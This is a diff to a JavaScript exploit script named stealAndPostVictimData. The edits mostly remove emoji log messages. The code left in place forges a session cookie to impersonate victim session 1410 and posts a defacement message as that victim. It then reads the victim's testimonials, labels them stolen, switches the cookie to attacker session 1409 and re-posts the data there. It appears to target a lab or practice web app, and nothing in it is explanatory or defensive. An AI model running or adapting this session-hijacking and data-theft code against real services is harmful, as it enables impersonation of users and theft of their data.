@@ -1,13 +1,8 @@
 (async function stealAndPostVictimData() {
-    
-    console.log("🚀 Starting attack on session 1410...");
 
     // ====================== 1. POST "you have been hacked" to Victim (1410) ======================
     document.cookie = "session=1410; path=/";
     await new Promise(r => setTimeout(r, 400));
-
-    console.log("📤 Posting 'you have been hacked' to session 1410...");
-
     await fetch('/api/testimonials', {
         method: 'POST',
         headers: {
@@ -27,7 +22,6 @@
     await new Promise(r => setTimeout(r, 800));
 
     // ====================== 2. FETCH All Victim Data (1410) ======================
-    console.log("📥 Fetching all testimonials from session 1410...");
 
     let victimTestimonials = [];
 
@@ -39,7 +33,7 @@
 
         if (res.ok) {
             victimTestimonials = await res.json();
-            console.log(`✅ Fetched ${Array.isArray(victimTestimonials) ? victimTestimonials.length : 1} testimonial(s)`);
+            console.log(`Fetched ${Array.isArray(victimTestimonials) ? victimTestimonials.length : 1} testimonial(s)`);
         }
     } catch (e) {
         console.error("Fetch failed", e);
@@ -67,18 +61,15 @@
                          `User Name: ${item.user_name || "N/A"}\n`;
     }
 
-    const finalContent = `🚨 STOLEN TESTIMONIALS FROM VICTIM (1410)\n\n` + 
+    const finalContent = `STOLEN TESTIMONIALS FROM VICTIM (1410)\n\n` + 
                         victimFormatted + 
                         `\n\n=== END OF VICTIM DATA ===`;
-
-    console.log("\n📋 Final Content to be posted to 1409:\n");
-    console.log(finalContent);
 
     // ====================== 3. POST to Attacker Session (1409) ======================
     document.cookie = "session=1409; path=/";
     await new Promise(r => setTimeout(r, 600));
 
-    console.log("📤 Posting stolen victim data to session=1409...");
+    console.log("Posting stolen victim data to session=1409...");
 
     await fetch('/api/testimonials', {
         method: 'POST',
@@ -92,9 +83,9 @@
         })
     })
     .then(r => r.text())
-    .then(text => console.log("✅ Successfully posted to 1409"))
+    .then(text => console.log("Successfully posted to 1409"))
     .catch(err => console.error("POST Error:", err));
 
-    console.log("🎯 Attack Completed! Data transferred from 1410 to 1409");
+
 
 })();
